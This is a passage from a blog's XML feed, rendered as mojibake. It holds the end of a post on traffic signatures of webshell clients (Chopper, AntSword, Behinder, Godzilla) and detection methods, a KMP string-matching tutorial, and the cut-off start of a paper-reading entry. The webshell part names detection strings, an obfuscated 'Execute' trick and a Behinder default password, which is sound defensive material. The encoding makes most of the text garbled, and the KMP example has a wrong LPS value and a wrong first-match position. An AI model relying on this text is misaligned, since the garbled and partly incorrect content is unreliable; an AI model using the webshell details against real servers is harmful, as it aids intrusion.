2016ç‰ˆæœ¬æµé‡è¿™é“¾æ¥æµé‡æœ€å¤§çš„å˜åŒ–åœ¨äºbodyä¸­éƒ¨åˆ†å­—ç¬¦è¢«unicodeç¼–ç æ›¿æ¢æ··æ·†ï¼Œæ‰€ä»¥è¿™ç§ç‰¹å¾éœ€è¦æå–å‡ºä¸€ç§å½¢å¼æ¥ï¼ŒåŒ¹é…è¿™ä¸ªæ··æ·†ç‰¹å¾ï¼Œæ¯”å¦‚â€œå­—ç¬¦+%u0000+å­—ç¬¦+%u0000â€è¿™ç§å½¢å¼æ¥åˆ¤æ–­è¯¥æµé‡ã€‚<br>     æˆ–è€…ç›´æ¥å°†è¿™éƒ¨åˆ†ä»£ç ç›´æ¥è¿›è¡Œunicodeè§£ç ï¼Œå¯ä»¥è·å–åˆ°å¦‚2011æˆ–2014ç‰ˆæœ¬çš„aspæ‰€ç¤ºçš„æµé‡ã€‚å¯ä»¥æ ¹æ®ä¸Šä¸€æ®µç‰¹å¾æ¥è¿›è¡Œåˆ¤æ–­ã€‚<br>     è¿™ç§æµé‡ä¸»è¦è¯†åˆ«è¿™å‡ éƒ¨åˆ†ç‰¹å¾ï¼Œåœ¨æ­£å¸¸æµé‡ä¸­åŸºæœ¬æ²¡æœ‰ã€‚</li><li><strong>èšå‰‘</strong>ï¼šä½¿ç”¨base64åŠ å¯†ï¼Œæµé‡ä¸­åŒ…å«<code>@ini_set (&quot;display_errors&quot;,&quot;0&quot;)</code>ä»£ç <br> èšå‰‘æµé‡ç‰¹å¾æ¦‚è¿°ï¼š<br> å¯ä»¥å¯¹æµé‡è¿›è¡ŒåŠ å¯†ã€æ··æ·†ã€‚ä½†æ˜¯æœ‰äº›å…³é”®ä»£ç æ²¡æœ‰è¢«åŠ å¯†ï¼Œå¦‚ï¼šPHPä¸­çš„ini_setï¼›ASPä¸­çš„OnErrorï¼Œresponseç­‰ï¼Œæµé‡ç‰¹å¾ï¼šä½¿ç”¨bse64åŠ å¯†çš„payloadï¼Œæ•°æ®åŒ…å­˜åœ¨ä»¥ä¸‹baseåŠ å¯†çš„evalå‘½ä»¤æ‰§è¡Œï¼Œæ•°æ®åŒ…çš„payloadå†…å®¹å­˜åœ¨å‡ ä¸ªåˆ†æ®µå†…å®¹ï¼Œåˆ†åˆ«éƒ½ä½¿ç”¨baseåŠ å¯†ï¼Œè§£å¯†åå¯ä»¥çœ‹åˆ°ç›¸å…³çš„è·¯å¾„ï¼Œå‘½ä»¤ç­‰ï¼›<br> ï¼ˆ1ï¼‰èšå‰‘PHPç±»WebShellé“¾æ¥æµé‡<br> å…¶ä¸­bodyæµé‡è¿›è¡ŒURLè§£ç åä¸ºï¼š<br> å…¶ä¸­æµé‡æœ€ä¸­æ˜æ˜¾çš„ç‰¹å¾ä¸º@ini_set(â€œdisplay_errorsâ€,â€0â€);è¿™æ®µä»£ç åŸºæœ¬æ˜¯æ‰€æœ‰WebShellå®¢æˆ·ç«¯é“¾æ¥PHPç±»WebShelléƒ½æœ‰çš„ä¸€ç§ä»£ç ï¼Œä½†æ˜¯æœ‰çš„å®¢æˆ·ç«¯ä¼šå°†è¿™æ®µç¼–ç æˆ–è€…åŠ å¯†ï¼Œè€Œèšå‰‘æ˜¯æ˜æ–‡ï¼Œæ‰€ä»¥è¾ƒå¥½å‘ç°ã€‚<br> ï¼ˆ2ï¼‰èšå‰‘ASPç±»WebShellé“¾æ¥æµé‡<br> å…¶ä¸­bodyæµé‡è¿›è¡ŒURLè§£ç åä¸ºï¼š<br> æˆ‘ä»¬å¯ä»¥çœ‹å‡ºèšå‰‘é’ˆå¯¹ASPç±»çš„WebShellæµé‡ä¸èœåˆ€çš„æµé‡å¾ˆåƒï¼Œå…¶ä¸­ç‰¹å¾ä¹Ÿæ˜¯ç›¸åŒï¼Œå¦‚OnError ResumeNextã€Response.Endã€Response.Writeï¼Œå…¶ä¸­executeåœ¨èšå‰‘ä¸­è¢«æ‰“æ–­æ··æ·†äº†ï¼Œå˜æˆäº†æ‹¼æ¥å½¢å¼Exâ€&amp;cHr(101)&amp;â€cuteï¼ŒåŒæ—¶è¯¥æµé‡ä¸­ä¹Ÿä½¿ç”¨äº†evalå‚æ•°ï¼Œå¯ä»¥è¢«è®¤ä¸ºæ˜æ˜¾ç‰¹å¾ã€‚</li><li><strong>å†°è</strong>ï¼šå®¢æˆ·ç«¯ä»¥Getå½¢å¼å‘èµ·å¸¦å¯†ç çš„è¯·æ±‚ï¼ŒæœåŠ¡ç«¯äº§ç”Ÿéšæœºå¯†é’¥å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯ç”¨AESåŠ å¯†payloadã€‚é»˜è®¤è¿æ¥å¯†ç ä¸ºâ€e45e329feb5d925bâ€ã€‚<br> å†°èæµé‡ç‰¹å¾æ¦‚è¿°ï¼šæ˜¯ä¸€æ¬¾åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ç½‘ç«™ç®¡ç†å®¢æˆ·ç«¯ã€‚ä¸»è¦ç”¨äºé…åˆæœåŠ¡ç«¯shellçš„åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†é€šä¿¡ï¼Œé€‚ç”¨äºWAFæ‹¦æˆªå›æ˜¾ç­‰åœºæ™¯ï¼Œå®¢æˆ·ç«¯çš„æµé‡æ— æ³•æ£€æµ‹ã€‚<br> ï¼ˆ1ï¼‰å†°è3.0ï¼š<br> éšç€å†°èçš„ä¸æ–­æ›´æ–°ï¼ŒåŠŸèƒ½è¶Šæ¥è¶Šå®Œå–„ï¼Œåˆ°3.0å·²ç»å…·å¤‡äº†çº¢é˜Ÿéœ€è¦çš„å„ç§åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯åå¼¹shellçš„msfå’Œcsä¸Šçº¿ï¼Œä»¥åŠè‡ªå®šä¹‰ä»£ç æ‰§è¡Œï¼Œçµæ´»æ€§å¾ˆå¼ºã€‚åŸºæœ¬åšåˆ°å¼€ç®±å³ç”¨ä¸”åŠŸèƒ½é½å…¨ï¼Œå”¯ä¸€çš„é—®é¢˜æ˜¯ï¼Œå·¥å…·æµè¡Œä¹‹åï¼Œwebshellæœ¬ä½“å®¹æ˜“è¢«æŸ¥æ€ï¼Œéœ€è¦åšwebshellæœ¬ä½“çš„å…æ€ã€‚<br> ç”±äºå†°èæŠŠç±»åŠ¨æ€åŠ è½½è¿™ä¸ªå…³é”®æŠ€æœ¯æ‘†åœ¨å°é¢ä¸Šï¼Œåœ¨ä¸€æ®µæ—¶é—´çš„ç ”ç©¶åï¼ŒJavaå†…å­˜é©¬å·²ç»æœ‰äº†å¾ˆå¤šå¯ç”¨çš„æ€è·¯ï¼Œæ¯”å¦‚æ–°å¢filterï¼Œåªä»å†…å­˜æ“ä½œï¼Œä¸ä¾èµ–è½åœ°æ–‡ä»¶ï¼Œå°±èƒ½è®¿é—®åˆ°å†…å­˜ä¸­çš„Webshellï¼Œè¿™å°±è§£å†³äº†webshellæœ¬ä½“å…æ€é—®é¢˜ã€‚ è¿™ç§æƒ…å†µä¸‹å†°èæ›´æ–°v3.0 beta7ç‰ˆæœ¬ï¼Œå¢åŠ äº†Javaå†…å­˜é©¬åŠŸèƒ½ï¼Œå¹¶ä¸”ä½¿ç”¨äº†æ›´é«˜çº§çš„Java AgentæŠ€æœ¯ï¼Œé€šè¿‡hook Javaè¿›ç¨‹ä¸­åŸæœ¬æ­£å¸¸çš„ç±»ï¼Œå®ç°å†…å­˜é©¬åŠŸèƒ½ï¼Œå¹¶åœ¨beta8å¢åŠ äº†å†…å­˜é©¬é˜²æŸ¥æ€æœºåˆ¶ã€‚<br> ï¼ˆ2ï¼‰å†°è4.0<br> å†°èæ›´æ–°äº†4.0ç‰ˆæœ¬ï¼Œå¢åŠ äº†webshellç”ŸæˆåŠŸèƒ½ï¼Œå¯ä»¥å®Œå…¨è‡ªå®šä¹‰æµé‡åŠ å¯†æ–¹æ³•ï¼Œå¯¹æµé‡åŠ å¯†çš„çµæ´»æ€§åˆå¤§å¤§å¢åŠ ã€‚åœ¨webshellå·¥å…·é¢†åŸŸï¼Œå†°èç‹¬å é³Œå¤´ã€‚åœ¨å»å¹´çš„æ”»é˜²æ¼”ç»ƒä¸­ç»Ÿè®¡åˆ°çš„webshellæœ‰æ•ˆæ”»å‡»ä¸­ï¼Œæœ‰80%éƒ½æ˜¯ä½¿ç”¨çš„å†°èæˆ–å†°èå˜ç§ï¼Œè¶³ä»¥è¯æ˜å†°èçš„å¼ºå¤§åŠŸèƒ½ã€‚ </li><li><strong>å“¥æ–¯æ‹‰</strong><br> <a href="https://blog.csdn.net/weixin_46684578/article/details/122148960">https://blog.csdn.net/weixin_46684578/article/details/122148960</a><br> <a href="https://www.cnblogs.com/danyue/p/18146698">https://www.cnblogs.com/danyue/p/18146698</a><br> <a href="https://blog.csdn.net/m0_74077634/article/details/141931463">https://blog.csdn.net/m0_74077634/article/details/141931463</a><br> <a href="https://www.cnblogs.com/smileleooo/p/18178347">https://www.cnblogs.com/smileleooo/p/18178347</a><br> æ˜¯åŸºäºæµé‡ã€HTTPå…¨åŠ å¯†çš„webshellå·¥å…·ï¼›å“¥æ–¯æ‹‰å…¨éƒ¨ç±»å‹çš„shell èƒ½ç»•è¿‡å¸‚é¢æ‰€æœ‰é™æ€æŸ¥æ€ï¼›å“¥æ–¯æ‹‰æµé‡åŠ å¯†èƒ½ç»•è¿‡å¸‚é¢å…¨éƒ¨æµé‡wafã€‚</li></ol><h2 id="Webshellæ£€æµ‹æ–¹æ³•"><a href="#Webshellæ£€æµ‹æ–¹æ³•" class="headerlink" title="Webshellæ£€æµ‹æ–¹æ³•"></a>Webshellæ£€æµ‹æ–¹æ³•</h2><p>ä½ æ‰€ä¸çŸ¥é“çš„Webshellâ€“è¿›é˜¶ç¯‡ <a href="https://cloud.tencent.com/developer/article/1647762">https://cloud.tencent.com/developer/article/1647762</a><br>ç›®å‰æ£€æµ‹Webshellçš„æ–¹å¼è¾ƒå¤šï¼Œæœ‰åŸºäºHTTPæµé‡ã€åŸºäºWebè®¿é—®æ—¥å¿—ã€åŸºäºæ–‡ä»¶ç‰¹å¾ç­‰æ–¹æ³•<br>ç»§ä¸ŠæœŸä»‹ç»äº†Webshellçš„åŸºç¡€çŸ¥è¯†å’Œé˜²æŠ¤æŠ€å·§åï¼Œæœ¬æœŸæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨Webshellçš„æ£€æµ‹æ–¹æ³•ã€‚ç”±äºWebshellçš„éšè”½æ€§å’Œå¤šå˜æ€§ï¼Œä»…ä¾é å•ä¸€æ‰‹æ®µéš¾ä»¥æœ‰æ•ˆæ£€æµ‹ã€‚å› æ­¤ï¼Œæœ¬æ–‡å°†é‡ç‚¹ä»‹ç»å¤šç§æ£€æµ‹æ–¹æ³•ï¼Œä»¥ååŠ©å®‰å…¨äººå‘˜å…¨é¢äº†è§£å¹¶éƒ¨ç½²æœ‰æ•ˆçš„Webshellæ£€æµ‹ç­–ç•¥ã€‚</p><ol><li>åŸºäºHTTPæµé‡çš„æ£€æµ‹<br>  åˆ©ç”¨ç½‘ç»œç›‘æ§å·¥å…·åˆ†æHTTPæµé‡æ˜¯æ£€æµ‹Webshellæ´»åŠ¨çš„ä¸€ç§æœ‰æ•ˆæ‰‹æ®µã€‚é€šè¿‡ç›‘æ§å¼‚å¸¸çš„HTTPè¯·æ±‚ï¼Œå¦‚éæ ‡å‡†æ—¶é—´çš„é«˜é¢‘è¯·æ±‚ã€å«æœ‰å¼‚å¸¸å‚æ•°çš„è¯·æ±‚ç­‰ï¼Œå¯ä»¥åˆæ­¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨Webshellæ´»åŠ¨ã€‚<br>  <strong>å®æ–½æ­¥éª¤ï¼š</strong></li></ol><ul><li><strong>éƒ¨ç½²ç½‘ç»œå—…æ¢å·¥å…·</strong>ï¼Œå¦‚Wiresharkæˆ–tcpdumpï¼Œæ•æ‰ç»è¿‡çš„HTTPåŒ…ã€‚</li><li><strong>åˆ†æHTTPè¯·æ±‚</strong>ï¼Œç‰¹åˆ«æ³¨æ„POSTè¯·æ±‚ï¼Œè¿™ç±»è¯·æ±‚é€šå¸¸ç”¨äºWebshellå‘½ä»¤çš„ä¼ è¾“ã€‚</li><li><strong>æ ‡è®°å¼‚å¸¸æ¨¡å¼</strong>ï¼Œå¦‚é¢‘ç¹è®¿é—®ã€å¤§é‡ä¸Šä¼ ä¸‹è½½æˆ–è€…å‘½ä»¤å‚æ•°ç­‰ã€‚</li></ul><ol start="2"><li>åŸºäºWebè®¿é—®æ—¥å¿—çš„æ£€æµ‹<br>  WebæœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—è®°å½•äº†æ‰€æœ‰è¿›å…¥ç½‘ç«™çš„è¯·æ±‚ï¼Œé€šè¿‡åˆ†æè¿™äº›æ—¥å¿—ï¼Œå¯ä»¥å‘ç°å¼‚å¸¸è®¿é—®æ¨¡å¼æˆ–ç–‘ä¼¼Webshellçš„è¸ªè¿¹ã€‚</li></ol><p>  <strong>å®æ–½æ­¥éª¤ï¼š</strong></p><ul><li><strong>æ”¶é›†è®¿é—®æ—¥å¿—</strong>ï¼Œå¦‚Apacheçš„access.logï¼ŒNginxçš„access.logã€‚</li><li><strong>ä½¿ç”¨æ—¥å¿—åˆ†æå·¥å…·</strong>ï¼Œå¦‚GoAccessæˆ–ELK Stackï¼ˆElasticsearch, Logstash, Kibanaï¼‰ï¼Œå¯¹æ—¥å¿—æ–‡ä»¶è¿›è¡Œæ·±å…¥åˆ†æã€‚</li><li><strong>è®¾ç½®è­¦æŠ¥</strong>ï¼Œå¯¹äºå¼‚å¸¸çš„è®¿é—®æ¨¡å¼ï¼Œå¦‚éä¸šåŠ¡æ—¶é—´çš„å¤§é‡è¯·æ±‚ã€é¢‘ç¹çš„åå°è·¯å¾„è®¿é—®ç­‰ï¼Œè®¾ç½®è‡ªåŠ¨è­¦æŠ¥ã€‚</li></ul><ol start="3"><li>åŸºäºæ–‡ä»¶ç‰¹å¾çš„æ£€æµ‹<br>  æ–‡ä»¶ç‰¹å¾æ£€æµ‹é€šè¿‡åˆ†æWebshellçš„ä»£ç æ¨¡å¼è¿›è¡Œè¯†åˆ«ã€‚è¯¥æ–¹æ³•ä¾èµ–äºæ›´æ–°çš„æ•°æ®åº“å’Œç‰¹å¾ç ï¼Œç”¨äºè¯†åˆ«å·²çŸ¥çš„Webshellã€‚</li></ol><p>  <strong>å®æ–½æ­¥éª¤ï¼š</strong></p><ul><li><strong>ä½¿ç”¨YARAå·¥å…·</strong>ï¼Œæ ¹æ®å·²çŸ¥çš„Webshellç‰¹å¾åˆ›å»ºè§„åˆ™ã€‚</li><li><strong>å®šæœŸæ›´æ–°è§„åˆ™åº“</strong>ï¼Œè·Ÿéšæ–°çš„Webshellå˜åŒ–æ›´æ–°ã€‚</li><li><strong>æ‰«æWebç›®å½•</strong>ï¼Œå°†YARAä¸å®šæœŸæ‰«æä»»åŠ¡ç»“åˆï¼Œæ£€æŸ¥æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚</li></ul><ol start="4"><li>åŸºäºè¡Œä¸ºåˆ†æçš„æ£€æµ‹<br>  è¡Œä¸ºåˆ†æä¸ä¾èµ–äºWebshellçš„ä»£ç ç‰¹å¾ï¼Œè€Œæ˜¯é€šè¿‡ç›‘æµ‹ç³»ç»Ÿçš„è¡Œä¸ºæ¥è¯†åˆ«å¼‚å¸¸ã€‚è¿™åŒ…æ‹¬æ–‡ä»¶çš„å¼‚å¸¸åˆ›å»ºã€ä¿®æ”¹ï¼Œä»¥åŠç³»ç»Ÿå‘½ä»¤çš„å¼‚å¸¸è°ƒç”¨ç­‰ã€‚</li></ol><p>  <strong>å®æ–½æ­¥éª¤ï¼š</strong></p><ul><li>**éƒ¨ç½²Sysmon (System Monitor)**ï¼Œç›‘æ§Windowsç¯å¢ƒä¸‹çš„ç³»ç»Ÿæ´»åŠ¨ï¼Œå¦‚è¿›ç¨‹åˆ›å»ºã€ç½‘ç»œè¿æ¥ç­‰ã€‚</li><li><strong>ä½¿ç”¨auditdæœåŠ¡</strong>ï¼Œåœ¨Linuxç¯å¢ƒä¸‹ç›‘æ§å…³é”®æ–‡ä»¶çš„è¯»å†™å’Œæ‰§è¡Œè¡Œä¸ºã€‚</li><li><strong>åˆ†æç³»ç»Ÿè°ƒç”¨æ—¥å¿—</strong>ï¼Œå¯¹äºä½¿ç”¨ç³»ç»Ÿç®¡ç†å‘½ä»¤å¦‚<code>netstat</code>ã€<code>ipconfig</code>ç­‰é¢‘ç¹çš„è¿›ç¨‹è¿›è¡Œè¿›ä¸€æ­¥åˆ†æã€‚</li></ul><h2 id="é€ƒé¿æŠ€æœ¯"><a href="#é€ƒé¿æŠ€æœ¯" class="headerlink" title="é€ƒé¿æŠ€æœ¯"></a>é€ƒé¿æŠ€æœ¯</h2><p>è¯¦è§webshellå…æ€ç¬”è®°</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘KMPç®—æ³•è¯¦è§£</title>
      <link href="/2024/10/18/algorithm/kmp/"/>
      <url>/2024/10/18/algorithm/kmp/</url>
      
        <content type="html"><![CDATA[<p>KMPï¼ˆKnuth-Morris-Prattï¼‰ç®—æ³•æ˜¯ä¸€ç§ç”¨äºå­—ç¬¦ä¸²æœç´¢çš„ç®—æ³•ï¼Œå®ƒå¯ä»¥åœ¨ä¸€ä¸ªæ–‡æœ¬å­—ç¬¦ä¸²ä¸­æœç´¢ä¸€ä¸ªæ¨¡å¼ï¼ˆå³å­å­—ç¬¦ä¸²ï¼‰ï¼Œå…¶æ—¶é—´å¤æ‚åº¦æ˜¯O(n + m)ï¼Œå…¶ä¸­næ˜¯æ–‡æœ¬å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œmæ˜¯æ¨¡å¼çš„é•¿åº¦ã€‚KMPç®—æ³•çš„å…³é”®ä¼˜åŠ¿æ˜¯å®ƒèƒ½åœ¨ä¸å›æº¯æ–‡æœ¬ä¸²çš„æŒ‡é’ˆçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡é¢„å¤„ç†æ¨¡å¼ä¸²ï¼Œå®ç°å¿«é€Ÿçš„æ¨¡å¼åŒ¹é…ã€‚</p><h2 id="KMPç®—æ³•çš„æ ¸å¿ƒæ€æƒ³ï¼š"><a href="#KMPç®—æ³•çš„æ ¸å¿ƒæ€æƒ³ï¼š" class="headerlink" title="KMPç®—æ³•çš„æ ¸å¿ƒæ€æƒ³ï¼š"></a>KMPç®—æ³•çš„æ ¸å¿ƒæ€æƒ³ï¼š</h2><p>KMPç®—æ³•çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªå«åšâ€œéƒ¨åˆ†åŒ¹é…è¡¨â€ï¼ˆPartial Match Tableï¼‰æˆ–è€…â€œæœ€é•¿å…¬å…±å‰åç¼€â€ï¼ˆLongest Prefix which is also Suffixï¼Œç®€ç§°LPSï¼‰æ•°ç»„çš„é¢„å¤„ç†ã€‚è¿™ä¸ªè¡¨ç”¨äºåœ¨å‘ç”Ÿä¸åŒ¹é…æ—¶ï¼Œå†³å®šæ–‡æœ¬å­—ç¬¦ä¸²ä¸­çš„å“ªä¸ªä½ç½®åº”è¯¥æ˜¯ä¸‹ä¸€ä¸ªæ¯”è¾ƒçš„å¼€å§‹ç‚¹ï¼Œä»è€Œé¿å…äº†ä»å¤´å¼€å§‹æ¯”è¾ƒã€‚</p><h2 id="å¦‚ä½•æ„å»ºLPSæ•°ç»„ï¼š"><a href="#å¦‚ä½•æ„å»ºLPSæ•°ç»„ï¼š" class="headerlink" title="å¦‚ä½•æ„å»ºLPSæ•°ç»„ï¼š"></a>å¦‚ä½•æ„å»ºLPSæ•°ç»„ï¼š</h2><ol><li><strong>åˆå§‹åŒ–ï¼š</strong> åˆ›å»ºä¸€ä¸ªLPSæ•°ç»„æ¥ä¿å­˜æ¯ä¸ªå‰ç¼€çš„æœ€é•¿å…¬å…±å‰åç¼€é•¿åº¦ã€‚åˆå§‹åŒ–ä¸€ä¸ªå˜é‡ <code>len</code> ä¸º 0ï¼Œè¿™ä¸ªå˜é‡è¡¨ç¤ºå½“å‰è®¡ç®—çš„æœ€é•¿çš„å…¬å…±å‰åç¼€çš„é•¿åº¦ï¼Œæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆLPS[0]ï¼‰æ€»æ˜¯0ã€‚</li><li><strong>å¤„ç†ï¼š</strong> ä»æ¨¡å¼ä¸²çš„ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹å¤„ç†åˆ°æœ€åä¸€ä¸ªå­—ç¬¦ã€‚<ul><li>å¦‚æœå½“å‰å­—ç¬¦å’Œ<code>len</code>æŒ‡å‘çš„å­—ç¬¦ç›¸åŒï¼Œå°±æ›´æ–°LPSæ•°ç»„ï¼Œ<code>len</code>åŠ 1ã€‚</li><li>å¦‚æœä¸åŒï¼Œå‡å°<code>len</code>å€¼ï¼Œç›´åˆ°<code>len</code>ä¸º0æˆ–è€…æ‰¾åˆ°ä¸€å¯¹ç›¸åŒçš„å­—ç¬¦ã€‚</li><li>å°†å½“å‰<code>len</code>çš„å€¼èµ‹ç»™LPSæ•°ç»„ã€‚</li></ul></li></ol><h2 id="å¦‚ä½•ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢ï¼š"><a href="#å¦‚ä½•ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢ï¼š" class="headerlink" title="å¦‚ä½•ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢ï¼š"></a>å¦‚ä½•ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢ï¼š</h2><ol><li><strong>åˆå§‹åŒ–æŒ‡é’ˆï¼š</strong> ä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆ<code>i</code>å’Œ<code>j</code>åˆ†åˆ«è·Ÿè¸ªæ–‡æœ¬å’Œæ¨¡å¼çš„ä½ç½®ã€‚</li><li><strong>åŒ¹é…è¿‡ç¨‹ï¼š</strong><ul><li>å½“<code>text[i]</code>å’Œ<code>pattern[j]</code>åŒ¹é…æ—¶ï¼Œå¦‚æœ<code>j</code>æ˜¯æ¨¡å¼çš„æœ€åä¸€ä½ï¼Œè¡¨ç¤ºæ‰¾åˆ°ä¸€ä¸ªåŒ¹é…ï¼Œè®°å½•ä½ç½®ï¼Œ<code>j</code>å›é€€åˆ°<code>LPS[j-1]</code>ã€‚</li><li>å¦‚æœ<code>text[i]</code>å’Œ<code>pattern[j]</code>ä¸åŒ¹é…ï¼Œå¦‚æœ<code>j</code>ä¸æ˜¯0ï¼Œå°†<code>j</code>å›é€€åˆ°<code>LPS[j-1]</code>ï¼Œå¦åˆ™<code>i</code>é€’å¢ã€‚</li></ul></li><li><strong>ç»§ç»­æ£€æŸ¥ï¼š</strong> ç§»åŠ¨<code>i</code>ï¼Œç›´åˆ°æ–‡æœ¬ç»“æŸã€‚</li></ol><h2 id="æ„å»ºLPSæ•°ç»„çš„æ­¥éª¤è¯¦è§£ï¼š"><a href="#æ„å»ºLPSæ•°ç»„çš„æ­¥éª¤è¯¦è§£ï¼š" class="headerlink" title="æ„å»ºLPSæ•°ç»„çš„æ­¥éª¤è¯¦è§£ï¼š"></a>æ„å»ºLPSæ•°ç»„çš„æ­¥éª¤è¯¦è§£ï¼š</h2><p>å‡è®¾æˆ‘ä»¬æœ‰æ¨¡å¼ä¸² <code>pattern = &quot;ABABCABAA&quot;</code>ï¼Œæˆ‘ä»¬è¦æ„å»ºä¸€ä¸ªLPSæ•°ç»„æ¥è¡¨ç¤ºæ¯ä¸ªå‰ç¼€çš„æœ€é•¿å…¬å…±å‰åç¼€é•¿åº¦ã€‚ä¸‹é¢æ˜¯æ„å»ºLPSæ•°ç»„çš„å…·ä½“æ­¥éª¤ï¼š</p><ol><li><p><strong>åˆå§‹åŒ–</strong>ï¼š</p><ul><li><code>len = 0</code>ï¼ˆè¡¨ç¤ºå½“å‰æœ€é•¿çš„å…¬å…±å‰åç¼€é•¿åº¦ï¼‰</li><li><code>LPS[0] = 0</code>ï¼ˆç¬¬ä¸€ä¸ªå…ƒç´ çš„æœ€é•¿å…¬å…±å‰åç¼€é•¿åº¦ä¸º0ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªå­—ç¬¦ï¼‰</li></ul></li><li><p><strong>éå†æ¨¡å¼ä¸²</strong>ï¼š</p><ul><li>ä»ç´¢å¼•1å¼€å§‹ï¼Œæ¯”è¾ƒå½“å‰å­—ç¬¦ä¸<code>len</code>ä½ç½®çš„å­—ç¬¦ã€‚</li><li>å¦‚æœåŒ¹é…ï¼Œ<code>len</code>å¢åŠ 1ï¼Œå¹¶å°†<code>len</code>èµ‹å€¼ç»™<code>LPS[i]</code>ã€‚</li><li>å¦‚æœä¸åŒ¹é…ï¼Œå‡å°‘<code>len</code>ç›´åˆ°0æˆ–æ‰¾åˆ°åŒ¹é…ã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…ï¼Œå¦‚å‰æ‰€è¿°æ“ä½œï¼›å¦‚æœ<code>len</code>å‡åˆ°0ä»æœªåŒ¹é…ï¼Œ<code>LPS[i]</code>è®¾ä¸º0ã€‚</li></ul></li></ol><p>å¯¹äº<code>pattern = &quot;ABABCABAA&quot;</code>ï¼Œæ„å»ºçš„LPSæ•°ç»„å¦‚ä¸‹ï¼š</p><table><thead><tr><th>i</th><th>Pattern[i]</th><th>len</th><th>LPS</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>0</td><td>0</td></tr><tr><td>1</td><td>B</td><td>0</td><td>0</td></tr><tr><td>2</td><td>A</td><td>1</td><td>1</td></tr><tr><td>3</td><td>B</td><td>0</td><td>0</td></tr><tr><td>4</td><td>C</td><td>0</td><td>0</td></tr><tr><td>5</td><td>A</td><td>1</td><td>1</td></tr><tr><td>6</td><td>B</td><td>2</td><td>2</td></tr><tr><td>7</td><td>A</td><td>3</td><td>3</td></tr><tr><td>8</td><td>A</td><td>1</td><td>1</td></tr></tbody></table><h2 id="ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢çš„æ­¥éª¤è¯¦è§£ï¼š"><a href="#ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢çš„æ­¥éª¤è¯¦è§£ï¼š" class="headerlink" title="ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢çš„æ­¥éª¤è¯¦è§£ï¼š"></a>ä½¿ç”¨LPSæ•°ç»„è¿›è¡Œæœç´¢çš„æ­¥éª¤è¯¦è§£ï¼š</h2><p>å‡è®¾æˆ‘ä»¬æœ‰æ–‡æœ¬ <code>text = &quot;ABABABCABAAABABCABAA&quot;</code>ï¼Œæˆ‘ä»¬è¦åœ¨è¿™ä¸ªæ–‡æœ¬ä¸­æœç´¢<code>pattern = &quot;ABABCABAA&quot;</code>ã€‚</p><ol><li><p><strong>åˆå§‹åŒ–æŒ‡é’ˆ</strong>ï¼š</p><ul><li><code>i = 0</code>ï¼ˆæ–‡æœ¬çš„ä½ç½®ï¼‰</li><li><code>j = 0</code>ï¼ˆæ¨¡å¼çš„ä½ç½®ï¼‰</li></ul></li><li><p><strong>æœç´¢è¿‡ç¨‹</strong>ï¼š</p><ul><li>éå†æ–‡æœ¬ï¼Œå½“<code>text[i]</code>å’Œ<code>pattern[j]</code>åŒ¹é…æ—¶ï¼Œé€’å¢<code>i</code>å’Œ<code>j</code>ã€‚</li><li>å¦‚æœ<code>j</code>è¾¾åˆ°æ¨¡å¼é•¿åº¦ï¼Œè¡¨æ˜æ‰¾åˆ°ä¸€ä¸ªå®Œæ•´åŒ¹é…ï¼Œè®°å½•åŒ¹é…çš„èµ·å§‹ä½ç½®<code>i-j</code>ï¼Œç„¶åå°†<code>j</code>å›é€€åˆ°<code>LPS[j-1]</code>ã€‚</li><li>å¦‚æœ<code>text[i]</code>å’Œ<code>pattern[j]</code>ä¸åŒ¹é…ï¼š<ul><li>å¦‚æœ<code>j</code>ä¸æ˜¯0ï¼Œå›é€€<code>j</code>åˆ°<code>LPS[j-1]</code>ã€‚</li><li>å¦‚æœ<code>j</code>æ˜¯0ï¼Œåˆ™ä»…é€’å¢<code>i</code>ã€‚</li></ul></li></ul></li></ol><p>å¯¹äºæˆ‘ä»¬çš„ä¾‹å­ï¼Œé¦–æ¬¡åŒ¹é…å‘ç”Ÿåœ¨æ–‡æœ¬çš„ç¬¬10ä¸ªå­—ç¬¦å¼€å§‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è®ºæ–‡ç²¾åº¦ã€‘CamPro Camera-based Anti-Facial Recognition</title>
      <link href="/2024/10/16/PaperReading/javacode/"/>
      <url>/2024/10/16/PaperReading/javacode/</url>
      
